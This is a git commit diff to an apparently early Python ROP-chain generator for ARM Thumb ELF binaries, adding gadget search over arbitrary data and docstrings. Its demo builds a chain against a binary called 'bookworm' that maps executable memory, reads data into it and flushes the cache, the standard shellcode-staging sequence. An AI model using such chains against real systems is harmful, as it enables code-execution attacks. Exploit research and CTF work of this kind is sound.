ff5bdcd79e3cb2e4efa2c04eab0ac9f1740e6403
Jonas Rudloff <jonas.t.rudloff@gmail.com>
2014-06-25 12:40:39 +0000

    can now analyse arbitary chunks of data + lots of comments

--- rop.py
+++ rop.py
@@ -14,56 +14,92 @@ def dict_keys_upper(d):
     return d2
 
 class ROP:
-    def __init__(self, f, base=0):
+    def __init__(self, f=None, base=0):
+        self.base = base
+        self.pops = []
+        self.ldmias = []
+        self.swi_0 = None
+        self.gadgets = []
+        self.ropchain = []
+        if f != None:
+            self.analyze_elf(f)
+
+    @property
+    def can_be_set(self):
+        """The set of registers that can be set"""
+        regs = []
+        map(regs.extend, map(lambda (a, pops): pops, self.gadgets))
+        return set(regs)
+
+    def analyze_elf(self, f):
+        """Analyze an ELF file to find rop gadgets
+        Arguemnts:
+            f(str/file/pyelf.ELFFile): file to analyze
+            off(int): offset relative to the base address
+        Returns:
+            None
+
+        Note:
+            Does only analyse .text section
+        """
         if type(f) == str:
             f = open(f, "r")
         if type(f) == file:
             f = pyelf.ELFFile(f)
         text_sec = f.getsection(".text")
-        text_data = text_sec.data
-        text_addr = text_sec.addr+base
-        self.disassembly_thumb = list(thumb.disassemble_all(text_data, text_addr))
-        self.disassembly_arm = list(arm.disassemble_all(text_data, text_addr))
-        self.pops = []
-        self.ldmias = []
-        self.swi_0 = None
-        self.gadgets = []
-        self.find_pops()
-        #self.find_ldmias()
-        self.find_syscall_gadget()
-        self.ropchain = []
-        random.shuffle(self.gadgets)
+        self.analyze(text_sec.data, text_sec.addr)
 
-    def find_pops(self):
-        self.pops = filter(
+    def analyze(self, data, off=0):
+        """Analyze a piece of data to find rop gadgets.
+        Arguments:
+            data(str): data to be analyzed.
+            off(int): offset relative to the base address
+        Returns:
+            None
+        """
+        disassembly_thumb = list(thumb.disassemble_all(data, off))
+        #disassembly_arm = arm.disassemble_all(data, off)
+        self.find_pops(disassembly_thumb)
+        self.find_syscall_gadget(disassembly_thumb)
+
+    def find_pops(self, disassembly):
+        """find all thumb mode pop gadgets that looks like:
+        pop {..., R15}
+        """
+        pops = filter(
                 lambda (addr, inst): inst[0] == "POP" and "R15" in inst[1],
-                self.disassembly_thumb)
-        self.gadgets += [(addr | 1, inst[1]) for (addr, inst) in self.pops]
+                disassembly)
+        self.pops += pops
+        self.gadgets += [(addr | 1, inst[1]) for (addr, inst) in pops]
 
     def find_ldmias(self):
+        """Does not work yet..."""
         for addr, inst in self.disassembly_arm:
             if inst[:3] == ("AL", "LDMIA", "R13!"):
                 if "R13" not in inst[3] and "R15" in inst[3]:
                     self.ldmias.append((addr, inst))
                     self.gadgets.append((addr, inst[3]))
 
-    def find_syscall_gadget(self):
-        for i in range(len(self.disassembly_thumb)-1):
-            addr, inst = self.disassembly_thumb[i]
+    def find_syscall_gadget(self, disassembly):
+        for i in range(len(disassembly)-1):
+            addr, inst = disassembly[i]
             if inst != ("SWI", 0):
                 continue
-            addr2, inst2 = self.disassembly_thumb[i+1]
+            addr2, inst2 = disassembly[i+1]
             if inst2[0] == "POP" and "R15" in inst2[1]:
                 if self.swi_0 and len(inst2[1]) > len(self.swi_0[1][1]):
                     continue
                 self.swi_0 = (addr, inst2)
 
     def find_best_gadget(self, regs):
+        """find 'best' to set registers
+        Current algorithm: the gadget that set most registers that is needed
+        """
         def gadget_score(gadget, regs):
-            return len(set(gadget) - regs)
+            return len(set(gadget) & regs)
         #must contain atleast one register we want.
         gadgets = ((a,g) for (a,g) in self.gadgets if len(set(g) & regs) > 0)
-        gadget = min(gadgets, key = lambda (a, g): gadget_score(g, regs))
+        gadget = max(gadgets, key = lambda (a, g): gadget_score(g, regs))
         return gadget
 
 
@@ -75,7 +111,7 @@ class ROP:
 
         while regs and regs != old_regs:
             addr, reg_pops = self.find_best_gadget(regs)
-            ropchain.append(addr)
+            ropchain.append(self.base+addr)
             ropchain += [regs_dict.get(reg, 0x41414141) for reg in reg_pops[:-1]]
             old_regs = set(regs)
             regs -= set(reg_pops)
@@ -94,7 +130,7 @@ class ROP:
         if self.swi_0 == None:
             raise Exception("SWI 0 gadget not found. Cannot not perform syscall")
         addr, pop_inst = self.swi_0
-        ropchain.append(addr | 1)
+        ropchain.append(self.base+addr | 1)
         ropchain += [regs_dict.get(reg, 0x41414141) for reg in pop_inst[1]]
         return ropchain[0], ropchain[1:]
 
@@ -102,6 +138,9 @@ class ROP:
         raise Exception("Symbol lookup not implemented yet. Doit yourself.")
 
     def call(self, func, *args):
+        """make a call to a function
+        Does not work yet, need better arm decompiler...
+        """
         if type(func) == str:
             func = self.lookup_symbol(func)
         regs_dict = dict(zip(["R0", "R1", "R2", "R3"], args))
@@ -113,13 +152,29 @@ class ROP:
         return set_regs_addr, (regsrop + swirop)
 
     def syscall(self, regs_dict):
+        """Make a syscall with rop
+        Arguments:
+            regs_dict(dict): dictionary of which registeres to be set to what
+
+        Example:
+            rop.syscall({"R7": 1}) # perfome exit syscall
+        """
         regs_dict = dict_keys_upper(regs_dict)
         self.ropchain.append(("syscall", regs_dict))
 
-    def return(self, addr):
+    def ret(self, addr):
+        """Return to address
+        Arguments:
+            addr(int): address to return to.
+
+        Warning:
+            The ropchain might not be able to continue after this...
+            This is intentionally.
+        """
         self.ropchain.append(("return", addr))
 
     def generate_ropchain(self):
+        """Generate the ropchain"""
         return_addr = None
         regs = set()
         rop = []
@@ -139,15 +194,17 @@ class ROP:
         return rop
 
     def flush(self):
+        """Flush the ropchain"""
         ropchain = "".join(map(p32, self.generate_ropchain()))
         self.ropchain = []
         return ropchain
 
 if __name__ == "__main__":
-    rop = ROP("bookworm")
+    rop = ROP("bookworm", 0xed000000)
+    print "regs that can be set: ", rop.can_be_set
     rop.syscall({"R0":0xaa0000, "R1":0x1000, "R2":7, "R3":0x32, "R4":0xffffffff, "R5":0, "R7":192})
-    rop.call(0x45454545, 0x11111111, 0x22222222, 0x55555555)
+    #rop.call(0x45454545, 0x11111111, 0x22222222, 0x55555555)
     rop.syscall({"R0":0, "R1":0xaa0000, "R2":0x142, "R7":3})
-    rop.call(0xaaaaaaaa, 0x1e1e1e1e, 0x42424242, 0x99995555)
-    rop.syscall({"R7":0xf0002})
+    #rop.call(0xaaaaaaaa, 0x1e1e1e1e, 0x42424242, 0x99995555)
+    rop.syscall({"R7":0xf0002, "R0":0xaa0000, "R1":0xaa1000})
     print map(hex, rop.generate_ropchain())
